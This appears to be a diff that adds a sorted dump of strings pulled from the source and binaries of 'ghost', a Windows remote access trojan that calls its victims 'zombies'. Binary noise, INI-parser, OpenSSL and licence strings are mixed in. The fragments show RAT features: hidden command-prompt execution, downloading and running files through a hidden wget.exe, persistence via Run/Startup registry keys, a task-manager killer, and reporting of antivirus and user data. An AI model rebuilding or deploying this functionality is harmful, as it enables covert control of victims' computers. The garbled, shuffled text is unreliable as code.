@@ -1,0 +1,764 @@
+"(					'data'  TEXT, 					CONSTRAINT uniData UNIQUE (data"
+"( 0, s_path.find_last_of('\\'"
+"( L( M* M* P-#P-#Q/""R0#S1$S1$T2%T2%S1$S1$S1$S1$S1$S1$S1$S1$R0#R0#R0#R0#R0#R0#R0#R0#T0&T0&T0&T0&T0&S/%S/%S/%R.$S/%S/%T0&U1'V2(V2(W3"
+"( client.init(str_host, str_port, TCP_SERVER, onClientConnect"
+"(!B(!A'!A'!@%!@%!>""!>""!>"""">"""">!$>!$> %@!$B!%B!%C""&D$%D$%E%&F&'F'&F'&F'$G(%G(%G(%H"
+"(!HANDLER(user, section, name, value"
+"(!HANDLER(user, section, prev_name, start"
+"(!X(""["
+"(!b_cmd && strcmp(c_new_data, ""CMD"""
+"(!strcmp(c_cmd, ""exit"""
+"(!strcmp(c_file, ""exit"""
+"(!strcmp(c_new_data, ""CMD"""
+"(!strcmp(c_new_data, ""ghost_ping"""
+"(!strcmp(c_new_data, ""ghost_tskmgr"""
+"(""%i"
+"(""%s\n\n"", c_ascii"
+"(""-----------------------"""
+"(""----------------------------------"""
+"(""..("
+"(""1.0.*"""
+"(""==============[ZOMBIES]=============="""
+"(""> """
+"(""Client timed out. You are directed back to the client's menu."""
+"(""Connected!\n"""
+"(""Connection error!\n"""
+"(""Could not run server... Try again."""
+"(""Done."""
+"(""Downloading, please wait.... Consider the client's download speed. If you don't get a response within an extended period of time, the client may have timed out or couldn't respond back.\n"""
+"(""Error executing query!\n"""
+"(""Invalid command. Try again."""
+"(""J(""K"
+"(""K"
+"(""L(""L'#K&""K%#J$""J$""J%!H& H& I'!J(""J"
+"(""No Antivirus Detected"""
+"(""Please enter your listening port: """
+"(""Query executed successfuly!\n"""
+"(""Refreshing clients... Please wait."""
+"(""That zombie does not exist. Please select a valid zombie from the list..."""
+"(""There are no zombies connected."""
+"(""There was an error attempting to start the command prompt. The zombie has disconnected\n"""
+"(""There was an error running this command. There is no connection to this zombie.\n"""
+"(""There was an error running this. There is no connection to this zombie.\n"""
+"(""This is taking longer than it should... The client may have timed out or is unable to send data back."""
+"(""Waiting for a response ....\n"""
+"(""Waiting for response....\n"""
+"(""Would you like to save this config to a file so you can instantly run this server in the future? (y/n"
+"(""[COLOR:BROWN]Configuration file saved as %s"", GHOST_CONFIG"
+"(""[COLOR:BROWN]Port: %s"", c_port.c_str("
+"(""[COLOR:CYAN][Username]: %s"", j_data[""USER""].get<std::string>("
+"(""[COLOR:LIGHTGREEN][Operating System]: %s"", j_data[""OS""].get<std::string>("
+"(""[COLOR:RED][Antivirus]: %s"", j_data[""AV""].get<std::string>("
+"(""[COLOR:YELLOW]You have selected \""%s\"" (%s:%s"
+"(""[RESPONSE]\n%s"", data"
+"(""\\/"""
+"(""\nEnter the file name you want it to execute as. Please include the extension as well. (Type \""exit\"" to exit"
+"(""\nEnter your URL (Type \""exit\"" to exit"
+"(""\nEnter your command (Type \""exit\"" to exit"
+"(""conin$"", ""r"", stdin"
+"(""conout$"", ""w"", stderr"
+"(""conout$"", ""w"", stdout"
+"(""debug.txt"", ios::out | ios::binary"
+"(""server"", ""port"", ""0"""
+"(""server"", ""timeout"", TIMEOUT_WARNING"
+"(""server"", ""warning"", TIMEOUT_WARNING"
+"(""wget.exe"""
+"(""wget.exe"", FILE_ATTRIBUTE_HIDDEN"
+"(""wget.exe"", ios::out | ios::binary"
+"(#F(#D%""D%""D%$C$#C#$B""#B""#B""#D""""D# E$!F%""F%""G&#H'$H(#M-(M-(M-(N.(N.(O/"
+"(#P(#R(#P(#T*%R*%T*%R*%T*%R*%T*%T*%X+'Z+'[,(\-"
+"($5,(;2/>74=85:5241-0-"
+"($L&$K%#J$$J$$I##I#!N($P(#Q*""Q*""R+#S,$T-$T-$U.%U.%U/#V0$V0$W1%W1%W1%[5"
+"($L&$K%%J$$J$$J$""P'$Q"
+"(%s, %s"
+"(%s,%s,%s,%s"
+"()			{ LOG(""[COLOR:GREEN]0"
+"()		{	LOG(""[COLOR:BROWN]IP: %s"", real_ip("
+"()		{ system(""CLS"""
+"()	{ LOG(""1"
+"() + std::string("" - """
+"() + std::string("":"" + j_data[""PORT""].get<std::string>("
+"(), 0, 0, 0"
+"(), 10, 0"
+"(), j_response[""FILE""].get<string>("
+"(), key.begin("
+"(), str_temp"
+"(), valstr.begin("
+"(): %s in %s(%g, %g"
+"(*s && (!chars || !strchr(chars, *s"
+"(,K'-J&,I%+N(.Q+1S*1O&-K"""
+"(,R-1V28S-3M'-P'.O"
+"(.L&,G#"
+"(/C!(F%,D#*C!'B &D &E!'I#"
+"(0, -1, 0, 0, 0, 3, 0, 0, 0"
+"(0, 0"
+"(0, 0, t_gui, 0, 0, 0"
+"(0, 0, t_ping, 0, 0, 0"
+"(0, 0, t_window, 0, 0, 0"
+"(0, f_response.beg"
+"(0, f_response.end"
+"(0, pos"
+"(0=no,1=yes,2=mandatory"
+"(164, 19"
+"(1;(1<*1H49L7:P;>T?BVADWBEWBEVADXCFYDGZEH[FI]HK^IL_JM`KN[HK]JM_LOaNQaNQ`MP`KN^ILWBEI47?(,=&*<%"
+"(1=errors, 2=trace"
+"(1=substring, 2=friendlyname, 3=container name"
+"(1=summary,2=friendly name, 4=full printout, 8=PEM output, 16=XXX, 32=private key info"
+"(1x,char"
+"(4x,int"
+"(6, 13"
+"(8x,mmx"
+"(BSTR bstr, int cp = CP_UTF8"
+"(BSTR bstr, int cp"
+"(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void **"
+"(CreateProcess(""wget.exe"", c_output, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &info, &processInfo"
+"(CreateProcess(c_cmd_dir, c_output, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &info, &processInfo"
+"(D"""
+"(D$,tQ@ "
+"(D%%E&%G'$J*'L,"
+"(FILE* file, ini_handler handler, void* user"
+"(G!'G!'G!'H""(H""(H""(I#"
+"(G!'G!'H""(H""(H""(I#"
+"(G!'G!'H""(H""(I#"
+"(GHOST_CONFIG, ios::out"
+"(GRMJ1#\'Fme]Kc3<0`{QCBa,$pDx2[h;g8_./unU|+fELqYN~}7l>=dzX?WkjTVH%@b6s9viIo4:v5Aw&O*tP!\\S^"
+"(Gentoo 4.8.1 p1.0, pie-0.5.6"
+"(Gentoo 4.8.2 p1.3r1, pie-0.5.8r1"
+"(Gentoo 4.9.3 p1.0, pie-0.6.2"
+"(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pScmdline, int iCmdshow"
+"(I'-N,2K'-N(.Q(/R"
+"(KEY_NON_ADMIN_TARGET, KEY_NON_ADMIN_STARTUP, 0, KEY_ALL_ACCESS, &h_key"
+"(KEY_TARGET, KEY_ROOT_STARTUP, 0, KEY_ALL_ACCESS, &h_key"
+"(KEY_TARGET, KEY_STARTUP, 0, KEY_ALL_ACCESS, &h_key"
+"(L"""""
+"(L""#ghost (github.com/AHXR"
+"(L""#ghost"""
+"(L""AHXR"""
+"(L""Copyright (c"
+"(L""RAT (github.com/AHXR"
+"(L""displayName"", 0, &cvtVersion, 0, 0"
+"(L""ghost (AHXR"
+"(L""ghost"""
+"(L""ghostlib"""
+"(L""taskmgr.exe"""
+"(L+(N-*N-*M,"
+"(L,'J*%I"
+"(M,"
+"(MAX_PATH, str_temp"
+"(NULL, ""open"", c_new_path, paramFormat, 0, 0"
+"(NULL, ""open"", j_response[""FILE""].get<string>("
+"(NULL, MAKEINTRESOURCE(IDR_HTML1"
+"(NULL, MAKEINTRESOURCE(IDR_RCDATA1"
+"(NULL, NULL, &t_payloads, 0, 0, 0"
+"(NULL, c_dir, MAX_PATH"
+"(NULL, hr_res"
+"(P.(O-'N,&L*$K"
+"(PROCESS_ALL_ACCESS, TRUE, d_task"
+"(Process32NextW(processesSnapshot, &processInfo"
+"(R,(V."
+"(R7#O4 P5!S8$W<'Z?+R1""R0#R0#Q/""Q/""Q/""P-#P-#Q.$P-#O,""N+!L"
+"(S3 S2""Q0!N+!O+!M( O"
+"(SOCKET clientSocket, CLIENTDATA info"
+"(SOCKET clientSocket, CLIENTDATA info, char * data"
+"(SOCKET clientSocket, int zombieID, char * data"
+"(SUCCEEDED(locator->ConnectServer(name, 0, 0, 0, 0, 0, 0, &services"
+"(SUCCEEDED(services->ExecQuery(L""WQL"", query, WBEM_FLAG_FORWARD_ONLY, 0, &e"
+"(System::Object^  sender, System::EventArgs^  e"
+"(System::Object^  sender, System::Windows::Forms::MouseEventArgs^  e"
+"(T$,l$(1D$"
+"(T6%Q3""O0!S1$S0&S0&R/%R.&R.&Q-%Q-%P,&O+%N*$M"
+"(TH32CS_SNAPPROCESS, NULL"
+"(WBEM_INFINITE, 1, &object, &u"
+"([/(Y/(Z.'X.'Z.'W-&Y-&V,%X,%X,%\.']-'^.(_/"
+"([E@qXTfelkgg^^lGIa:<[46X13O*.S.2X37S.2L&,M'-O"
+"(\,&\,&]-'`.(a0(c/(d0"
+"(]4+a5.b6/a3,a3,a3+a3+b4"
+"(b;,b;-_7+\3*^2+`4-b6/b6/d6.d6.d7,d7,d8+d8+`6*`6*`6*_5"
+"(bstr, str, cp"
+"(buffer, read"
+"(c_cmd, s_cmd.data("
+"(c_cmd_dir, ""%s\\cmd.exe"", str_windows"
+"(c_comp_name, &c_comp_size"
+"(c_new_data, data"
+"(c_new_path, ""%s%s"", str_temp, s_file_name.c_str("
+"(c_new_path, ""%s\\%s"", str_windows, s_file_name.c_str("
+"(c_new_path, ios::out | ios::binary"
+"(c_output, ""/C %s > %s"", c_new_data, c_temp_cmd"
+"(c_output, ""/C wget %s -O %s"", j_response[""URL""].get<string>("
+"(c_read, i_length"
+"(c_send_toggle, ""ghost_tskmgr"""
+"(c_temp_cmd, ""%s%s"", str_temp, TMPLOG"
+"(c_temp_cmd, ios::in | ios::binary"
+"(c_username, &c_username_size"
+"(char* dest, const char* src, size_t size"
+"(char* str, int num, void* stream"
+"(cli::safe_cast<System::Drawing::Icon^>(resources->GetObject(L""$this.Icon"""
+"(cli::safe_cast<System::Drawing::Icon^>(resources->GetObject(L""taskbarIcon.Icon"""
+"(client.Socket_Client, &buf, 1, MSG_PEEK"
+"(clientSocket, i_zombie_idx, new_data"
+"(client_data.socketRef, ""CMD"", 3, 0"
+"(client_data.socketRef, c_read, strlen(c_cmd"
+"(client_data.socketRef, encryptCMD(string(""ghost_ping"""
+"(client_data.socketRef, s_json_dump.data("
+"(client_data.socketRef, s_send_toggle.data("
+"(conn, buffer, sizeof(buffer"
+"(const BSTR bstr, std::string& dst, int cp = CP_UTF8"
+"(const char* filename, ini_handler handler, void* user"
+"(const char* s, const char* chars"
+"(const char* string, ini_handler handler, void* user"
+"(const std::string &s, char delim"
+"(const std::string &s, char delim, Out result"
+"(const std::string& section, const std::string& name"
+"(const std::string& section, const std::string& name, bool default_value"
+"(const std::string& section, const std::string& name, double default_value"
+"(const std::string& section, const std::string& name, long default_value"
+"(const string &s, char delim"
+"(const string& section, const string& name"
+"(const string& section, const string& name, bool default_value"
+"(const string& section, const string& name, const string& default_value"
+"(const string& section, const string& name, double default_value"
+"(const string& section, const string& name, long default_value"
+"(cp, 0, bstr, -1, &dst[0], res, NULL, NULL"
+"(cp, 0, bstr, -1, NULL, 0, NULL, NULL"
+"(data, s_data.data("
+"(decimal ""1234"", ""-1234"", or hex ""0x4d2"""
+"(dest, src, size"
+"(encryptCMD(string(""Invalid command or empty response."""
+"(encryptCMD(string(b_taskmgr ? ""Task Manager Killer Enabled"" : ""Task Manager Killer Disabled"""
+"(file, handler, user"
+"(filename, ""r"""
+"(full_path, ""\""%s\"" %s %s"", c_path, str_host, str_port"
+"(full_path, ""explorer.exe,\""%s %s %s\"""", c_path, str_host, str_port"
+"(ghostlib::_clientData{ clientSocket, info }"
+"(h_key, KEY_SHELL_NAME, 0, REG_SZ, (LPBYTE"
+"(h_key, KEY_VALUE_NAME, 0, REG_SZ, (LPBYTE"
+"(h_mod, (char *"
+"(h_process, 1"
+"(int idx, SOCKET sockref"
+"(int,enum nlohmann::basic_json<std::map,std::vector,std::basic_string<char,std::char_traits<char>,std::allocator<char> >,bool,__int64,unsigned __int64,double,std::allocator>::parse_event_t,nlohmann::basic_json<std::map,std::vector,std::basic_string<char,std::char_traits<char>,std::allocator<char> >,bool,__int64,unsigned __int64,double,std::allocator> &"
+"(kernel, window system, and so on"
+"(lib, ""Advapi32.lib"""
+"(lib, ""Wininet.lib"""
+"(lib, ""shell32.lib"""
+"(lib, ""user32.lib"""
+"(lib, ""wbemuuid.lib"""
+"(looking for field %d, got %d, '%s' left"
+"(max-age: %u, includeSubdomains: %s"
+"(new_data, data"
+"(onClientRecData, false"
+"(paramFormat, ""%s %s"", str_host, str_port"
+"(prev_name, name, sizeof(prev_name"
+"(processInfo.hProcess, 5000"
+"(processInfo.hProcess, INFINITE"
+"(processesSnapshot, &processInfo"
+"(reader(line, INI_MAX_LINE, stream"
+"(s, delim, std::back_inserter(elems"
+"(section, name"
+"(section, name, """""
+"(section, start + 1, sizeof(section"
+"(services, 10, 0, 0, 3, 3, 0, 0"
+"(skipping ""LIST -a"""
+"(skipping ""LIST"""
+"(start + 1, ""]"""
+"(start, ""=:"""
+"(std::cin, s_cmd"
+"(std::cin, s_file"
+"(std::getline(ss, item, delim"
+"(str_windows, MAX_PATH"
+"(strcmp(c_cmd, ""exit"""
+"(strcmp(c_file, ""exit"""
+"(strcmp(data, ""CMD"""
+"(that is, it is not the real %s"
+"(this, &gui::gui_Load"
+"(this, &gui::taskbarIcon_MouseDoubleClick"
+"(u, s, n, v"
+"(u, s, n, v, lineno"
+"(valstr == ""false"" || valstr == ""no"" || valstr == ""off"" || valstr == ""0"""
+"(valstr == ""true"" || valstr == ""yes"" || valstr == ""on"" || valstr == ""1"""
+"(value, &end"
+"(value, &end, 0"
+"(value, NULL"
+"(was_space && strchr(INI_INLINE_COMMENT_PREFIXES, *s"
+( !b_skip 
+( M
+( M( N
+( R*%R*%S
+( char * data
+( char * data 
+( int idx 
+( std::string text 
+( strcmp( string(string(s_path
+(!	
+(!a_server.start_server(s_option.c_str(
+(!b_good
+(!bstr
+(!error
+(!file
+(!line
+(!processName.compare(processInfo.szExeFile
+(!u
+(#R*%R+#P
+($M'%L&$K%%K%#R
+($X
+(%G(%H
+(%H
+(%I
+(%I*&J
+(%J
+(%d
+(%d bit
+(%frm
+(%ld unused bits
+(%lu
+(%p
+(%s
+(%s and %s
+(%s bytes
+(%s/%.2f
+(%s0x%lx
+(&M'%N'%S*'S+&T-%U.&V/'V/'W0'W0'V/&V/&V0$W1%W1%W1%X2&X2&[5
+('M64eOQkVYs^aq^agTWUDGE6:;-1
+((char *
+((ini_reader
+((s->version==DTLS1_BAD_VER
+((unsigned char
+()		{ AllocConsole(
+()		{ FreeConsole(
+()
+() checking on (non-zero
+() equivalent used by ini_parse_string(
+() here instead of _values.at(
+().c_str(
+()B &C!'H&-F$+F!
+(**ghost.conf**
+(*--p
+(*Q&
+(*end
+(*end == '=' || *end == ':'
+(*end == ']'
+(*ini_handler
+(*ini_reader
+(*prev_name && *start && start > line
+(*s
+(*s && isspace((unsigned char
+(*start
+(*start == ';' || *start == '#'
+(*start == '['
+(+ 
+(+>
+(-1
+(-N&+O'
+(-i -F
+(.K%+G#
+(.N(.I#
+(.N(.N(.I#
+(.N(.N(.O
+(.N(.O
+(/R
+(0
+(0 unlimits
+(0x%lX
+(0x%lx
+(0xEF 0xBB 0xBF
+(1
+(1/21/2018
+(10
+(100
+(1000
+(1024
+(11
+(12
+(12/12/2017
+(12/17/2017
+(128
+(13
+(14
+(15
+(16
+(168
+(17
+(18
+(19
+(1G(1H(3K
+(2
+(20
+(2000
+(256
+(3
+(3000
+(3L*4K&.M'-M'-M'-N(.N(.N(.O
+(4
+(40
+(5
+(5#0B+9O5B\AKnLWxV]_gY`U[OSt?Bd-0b
+(512
+(56
+(6
+(64
+(7
+(8
+(9
+(93
+(<'
+(@+
+(A?
+(AHXR
+(AI
+(ANY
+(Administrator Privileges Required
+(B1D$.
+(C
+(D
+(DOMAIN
+(EXIT_FAILURE
+(EXIT_SUCCESS
+(EXPERIMENTAL
+(F%
+(G#
+(GHOSTLIB data
+(GHOST_CONFIG
+(GetVersionEx(&vi
+(H
+(H!
+(Hidden
+(I
+(INIReader*
+(INI_MAX_LINE
+(INVALID PSS PARAMETERS
+(IP & Port
+(J
+(LPVOID lpParams
+(LPVOID params
+(M
+(Missing column 'a'.
+(Missing column 'k'.
+(Missing column 'u'.
+(N
+(N.
+(NONE
+(NULL
+(Negative
+(O
+(OVERFLOW
+(P+'O*&P*&U-(W-(X.'X.'Y/(Z0
+(PEM/DER
+(PLOSS
+(R
+(R.(O*&N
+(S/
+(SGML
+(SIGN
+(SOCKET socketRef
+(SSL/TLS
+(STD_OUTPUT_HANDLE
+(Stanford University
+(T<
+(TLOSS
+(UNDERFLOW
+(URL_DATA.dump(
+(W/*Z0+Z0
+(W3
+(WSAGetLastError(
+(X.500
+(X1
+(X5(W5(X7(Y8
+(X:
+(XML_Char
+(XML_LChar
+(Z0
+(Z1(Z1([1*[1*]1*Z0
+(Z4(Y3'Y3'Y3'W1%W1%W1%W1%W1%W1%W1%W1%Z2&Z2&[3'\4(\4(]5
+(Z4(Y3'Y3'Y3'W1%W1%W1%W1%W1%W1%W1%W1%Z2&Z2&[3'\4(]5
+(Z4(Y3'Y3'Y3'W1%W1%W1%W1%W1%W1%W1%W1%Z3%]3&]3&^4'_5(`6
+(Z4(Y3'Y3'Y3'W1%W1%W1%W1%W1%W1%W1%Y1%]3&]3&^4'^4'_5(`6
+(Z4(Z4([5
+([5
+([ahxrlogger](https://github.com/AHXR/ahxrlogger
+(\0
+(\4([3'[3'[3'Y1%Y1%Y1%Y1%Y1%Y1%Y1%Y1%]3&_3&`4'a5(b6
+(\4([3'[3'[3'Y1%Y1%Y1%Y1%Y1%Y1%Y1%Y1%`4'`4'`4'a5(b6
+(\4([3'[3'[3'Y1%Y1%Y1%Y1%Y1%Y1%Y1%Y1%`4'`5&a6'a6'b7(c8
+(\4([3'[3'[3'Y1%Y1%Y1%Y1%Y1%Y1%Y1%[1$`4'`5&a6'b7(b7(c8
+(\9+U2%T-$X1(Z3+Z3+\2+\2+\3*\3*\3*^3*]2
+(]3&\1%_2&c7
+(^.(a0(a0(b1
+(^1&]/']0%\.&\/$\.&[.#[-%[-%].&^/'_0(`1
+(^2+d81d81f80f80f80f9.f9.f:-_5
+(^4(]3']3']3'\2&\2&\2&[1%[1%]0%_1&`2'a3(b5(b6
+(^4(^4(]3'\2&\2&\2&\2&[1%[1%[1%\/$^0%_1&_1&a3(b4
+(_5(_5(^4'^4']3&]3&]3&\2%\2%\2%^1&^1&_3&`4'b6
+(_5(_5(^4'^4'^4']3&]3&\2%\2%\2%^2%^2%_3&`4'b6
+(_CRT_SECURE_NO_WARNINGS
+(_MSC_VER
+(_Ptr_ptr
+(_Ptr_user & (_BIG_ALLOCATION_ALIGNMENT - 1
+(`-'
+(`3(_1
+(`3(`4'`4'a7*a7*a7*`6
+(`xn--'
+(a
+(a5(a7*a7*`6
+(args->Length < 2
+(args[0]
+(args[1]
+(as per Python configparser
+(at your option
+(b
+(b1
+(b_cmd
+(b_gui_active
+(b_hidden
+(b_taskmgr
+(b_waiting
+(boolean
+(buffer[0]
+(c
+(c == '\n'
+(c->iv
+(c_comp_name
+(c_dir
+(c_new_data
+(c_read[i_length - 1] == '\n'
+(c_temp_cmd
+(char *
+(char*
+(char* s
+(cipher
+(cli::array<System::String^>^ args
+(client.Socket_Client
+(client.Socket_Client != INVALID_SOCKET
+(clientSocket
+(client_data.begin(
+(client_data.socketRef == INVALID_SOCKET
+(client_data.system_data
+(client_data[i].socketRef == socketRef
+(cmd.exe
+(components
+(compressed
+(const char *
+(const char * 
+(const char* s
+(const std::string& filename
+(const std::wstring & processName
+(const std::wstring& processName
+(const string& filename
+(contains a NUL character
+(ctx
+(ctx->buf
+(ctx->enc_data
+(ctx->iv
+(ctx->key
+(ctx_num_left == 0 || num < 2
+(cvtVersion.bstrVal
+(d
+(d1
+(d_task != 0
+(data
+(decimal
+(default
+(default CSP used if not specified
+(default RSA_PROV_FULL
+(default is to keep parsing
+(default port is 990
+(dll
+(dllexport
+(dllimport
+(e
+(encryptCMD( string( c_read 
+(encryptCMD(string(c_output
+(encryptCMD(sys_data.dump(
+(env
+(env SYSTEM_WGETRC
+(err == SOCKET_ERROR
+(err.c
+(error
+(expired tkt?
+(f
+(f3
+(fD
+(fD2fD1fD*fD
+(fF
+(f_file_write.good(
+(false
+(file
+(filename.c_str(
+(floating point double
+(for any work
+(from %s
+(g
+(gcnew System::ComponentModel::ComponentResourceManager(gui::typeid
+(gcnew System::ComponentModel::Container(
+(gcnew System::Windows::Forms::NotifyIcon(this->components
+(ghost gui
+(ghostlib::getZombieCount(
+(github.com/AHXR
+(gratis or for a charge
+(h
+(h_key
+(has CA markings
+(hex
+(hostname or IP
+(hstdout
+(http://searchsecurity.techtarget.com/definition/RAT-remote-access-Trojan
+(https://github.com/AHXR
+(https://github.com/AHXR/ahxrlogger
+(https://github.com/AHXR/ahxrwinsocket
+(hybrid
+(i
+(i & 0xFF
+(i_length > 0
+(i_menu
+(i_menu != 0
+(i_option
+(i_option != 0
+(i_option - 1
+(i_option == 0
+(i_option > ghostlib::getZombieCount(
+(i_res == SOCKET_ERROR
+(idx
+(if any
+(if you work as a programmer
+(including a cross-claim or counterclaim in a lawsuit
+(including a physical distribution medium
+(inf or 0 for infinite
+(info
+(ini_config.ParseError(
+(ini_parse_string_ctx*
+(int
+(int i = 0; i < ghostlib::getZombieCount(
+(int idx
+(internal
+(invalid token
+(iv
+(j
+(k
+(key
+(key.begin(
+(keytab perms?
+(l
+(l_key == ERROR_ACCESS_DENIED
+(l_key == ERROR_SUCCESS
+(l_set_key == ERROR_SUCCESS
+(line
+(lineno == 1 && (unsigned char
+(local %s
+(long
+(lp_res
+(m
+(malloc/free
+(max %d
+(md_tmp
+(n
+(net
+(new refcount %d
+(nil
+(no description
+(no output
+(no tkt?
+(no tm
+(no yr
+(non-permanent
+(non-zero
+(not case sensitive
+(not dir
+(null
+(num > 1 && ctx_num_left != 0
+(nv
+(o
+(objstr
+(of chars
+(only when INI_USE_STACK is zero
+(operated by you or a third party
+(or copies made from those copies
+(overwriting them
+(p
+(p > s && isspace((unsigned char
+(partial
+(persistent connections
+(posix
+(processInfo
+(processInfo.hProcess
+(processInfo.hThread
+(processesSnapshot
+(processesSnapshot == INVALID_HANDLE_VALUE
+(q
+(r
+(reader->_values[key].size(
+(real_ip
+(regardless of how the transaction is characterized
+(res
+(res > 0
+(result++
+(retval=%g
+(rstrip(start
+(s
+(s_cmd
+(s_cmd.c_str(
+(s_data
+(s_file.c_str(
+(s_json_dump
+(s_menu.c_str(
+(s_option.c_str(
+(s_output.c_str(
+(s_path.find_last_of('\\'
+(s_save != 'y' && s_save != 'n'
+(s_save == 'y'
+(s_send_toggle
+(s_send_toggle.data(
+(see LICENSE.txt
+(semicolon
+(size %s
+(size bytes
+(size?
+(size_t
+(size_t i = 0; i < client_data.size(
+(ssl->sid_ctx
+(start
+(std::string text
+(strcmp(s_path.c_str(
+(string
+(substitution cipher
+(system
+(t
+(t$z
+(text[i] == c_encrypt[x]
+(text[i] == c_original[x]
+(this is the default
+(to be replaced.
+(true
+(try:%2d
+(u
+(unauthoritative
+(uncompressed
+(unknown
+(unsigned char
+(unsigned int
+(unsigned int i = 0; i <= text.length(
+(unsigned int x = 0; x <= ENCRYPT_CMD_LEN; x++
+(unsigned short
+(us_timeout == us_exit
+(us_timeout == us_warning
+(use heap instead if you need to
+(user
+(usually known as the basename
+(v
+(valstr.begin(
+(value
+(vi
+(vi.dwMajorVersion
+(vi.dwMinorVersion == 0
+(vi.dwMinorVersion == 1
+(vi.dwMinorVersion == 2
+(vi.dwMinorVersion == 3
+(void
+(void *
+(w
+(whitespace stripped
+(will override default
+(with or without modification
+(x
+(xml
+(xmlns
+(y
+(z
+(zero
